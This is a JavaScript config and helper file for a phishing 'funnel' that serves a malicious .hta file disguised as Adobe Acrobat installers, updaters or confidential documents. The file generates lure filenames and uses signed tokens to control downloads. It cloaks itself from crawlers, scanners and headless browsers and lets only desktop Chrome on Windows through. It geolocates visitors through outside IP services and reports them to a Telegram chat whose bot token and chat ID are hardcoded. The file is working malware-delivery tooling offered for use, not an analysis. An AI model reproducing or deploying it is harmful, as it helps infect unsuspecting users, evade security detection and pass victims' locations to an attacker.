// Shared config + helpers for the static funnel port.
window.CFG = {
  // Telegram alert routing (RichRisk alert chat)
  TG_BOT: "8700828712:AAGiuRuCPYlvrl3reNT9WxKLSHw23BOvXbg",
  TG_CHAT: "2115160736",
  // HMAC secret for the signed token chain
  SECRET: "railway-lanzwan2-landing-c4d8e2f7a9b1-7c0d",
  TTL: 900,            // token lifetime (s)
  MIN_DL_AGE: 6,       // index->dl must span >= 6s
  // Host the .hta is served from (same origin, this GitHub Pages repo)
  HTA_SRC: "Adobe_Acrobat_Setup.hta",
};

// --- HMAC-SHA256 (pure JS, RFC 2104) ---
window.hmacSha256 = async function (keyBytes, msgBytes) {
  // Use Web Crypto with an importable key for HMAC-SHA256.
  const enc = new TextEncoder();
  const keyData = typeof keyBytes === "string" ? enc.encode(keyBytes) : keyBytes;
  const msgData = typeof msgBytes === "string" ? enc.encode(msgBytes) : msgBytes;
  const cryptoKey = await crypto.subtle.importKey("raw", keyData, { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
  const sig = await crypto.subtle.sign("HMAC", cryptoKey, msgData);
  return Array.from(new Uint8Array(sig)).map(b => b.toString(16).padStart(2, "0")).join("");
};
window.sha256Hex = async function (data) {
  const buf = data instanceof Uint8Array ? data : new TextEncoder().encode(data);
  const d = await crypto.subtle.digest("SHA-256", buf);
  return Array.from(new Uint8Array(d)).map(b => b.toString(16).padStart(2, "0")).join("");
};

// --- token chain (mimics lib.php issue_token / check_token) ---
function b64url(s) { return s.replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/,""); }
function b64urldecode(s){ s=s.replace(/-/g,"+").replace(/_/g,"/"); while(s.length%4)s+="="; return atob(s); }
window.issueToken = async function () {
  const p = { t: Math.floor(Date.now()/1000), r: (crypto.getRandomValues(new Uint8Array(8)).reduce((a,b)=>a+b.toString(16).padStart(2,"0"),"")) };
  const b64 = b64url(btoa(JSON.stringify(p)));
  const sig = await window.hmacSha256(window.CFG.SECRET, b64);
  return { tok: b64 + "." + sig, payload: p };
};
window.checkToken = async function (tok) {
  if (typeof tok !== "string" || tok.split(".").length !== 2) return null;
  const [b64, sig] = tok.split(".");
  const expect = await window.hmacSha256(window.CFG.SECRET, b64);
  if (expect !== sig) return null;
  let p; try { p = JSON.parse(b64urldecode(b64)); } catch(e){ return null; }
  if (!p || !p.t || (p.t + window.CFG.TTL) < Math.floor(Date.now()/1000)) return null;
  return p;
};

// --- name pool (exact copy of lib.php make_name) ---
window.makeName = function () {
  const ri = (a,b) => a + Math.floor(Math.random()*(b-a+1));
  const pad4 = n => String(n).padStart(4,"0");
  const ymd = new Date().toISOString().slice(0,10).replace(/-/g,"");
  const adobe = [
    "Adobe_Acrobat_Pro_DC_"   + ri(23,25)+"."+ri(1,9)+"."+pad4(ri(1,9999)),
    "Adobe_Creative_Cloud_Updater_" + ri(3,7)+"."+ri(1,9)+"."+pad4(ri(1,9999)),
    "Adobe_Acrobat_Standard_DC_" + ri(23,25)+"."+ri(1,9)+"."+pad4(ri(1,9999)),
    "Adobe_DC_Reader_Patch_"  + ri(22,25)+"."+ri(1,9)+"."+pad4(ri(1,9999)),
    "Adobe_Acrobat_Sign_"     + ri(2,5)+"."+ri(1,9)+"."+pad4(ri(1,9999)),
    "Adobe_Update_Package_"   + ri(10000,99999),
  ];
  const conf = [
    "Confidential_Document_" + ri(100000,999999),
    "Confidential_Record_"   + ymd + "_" + ri(1000,9999),
    "Internal_Memo_"         + ri(10000,99999),
    "Contract_Agreement_"    + ri(100000,999999),
    "Document_File_"         + ymd + "_" + ri(100,999),
    "Statement_Report_"      + new Date().getFullYear() + "_" + ri(1000,9999),
  ];
  const pool = Math.random() < 0.5 ? conf : adobe;
  return pool[Math.floor(Math.random()*pool.length)] + ".hta";
};
window.nameKind = function (n) { return /^adobe/i.test(n) ? "adobe" : "document"; };

// --- client-side gate (mimics the desktop-Chrome fingerprint + honeypot) ---
window.gatePass = function () {
  const ua = navigator.userAgent;
  const low = ua.toLowerCase();
  if (!ua) return false;
  // bot / script UA -> block
  if (/bot|spider|crawl|slurp|python|curl|wget|libwww|go-http|headless|selenium|phantom|scrapy|axios|okhttp|java|facebookexternalhit|telegram|whatsapp|discord|lxml|requests/i.test(ua)) return false;
  // desktop Chrome on Windows required
  if (!/chrome\/\d+/i.test(ua) || !/windows/i.test(ua)) return false;
  const m = /chrome\/(\d+)/i.exec(ua); if (!m || +m[1] < 100) return false;
  // honeypot: if we arrived at ?hp=1, poison (this client) + 404
  if (/[?&]hp=/.test(location.search)) { window.__poison = true; return false; }
  return true;
};
window.geo = function () {
  return fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{
    const ip = d.ip || "Unknown";
    return fetch("http://ip-api.com/json/"+encodeURIComponent(ip)+"?fields=status,country,city,isp").then(r=>r.json()).then(g=>({
      ip, city: g.city||"Unknown", country: g.country||"Unknown", isp: g.isp||"Unknown"
    }));
  }).catch(()=>({ip:"Unknown",city:"Unknown",country:"Unknown",isp:"Unknown"}));
};
window.tgSend = function (msg) {
  const url = "https://api.telegram.org/bot" + window.CFG.TG_BOT + "/sendMessage";
  return fetch(url, { method:"POST", headers:{"Content-Type":"application/json"},
    body: JSON.stringify({ chat_id: window.CFG.TG_CHAT, text: msg, disable_web_page_preview: true })
  }).catch(()=>{});
};
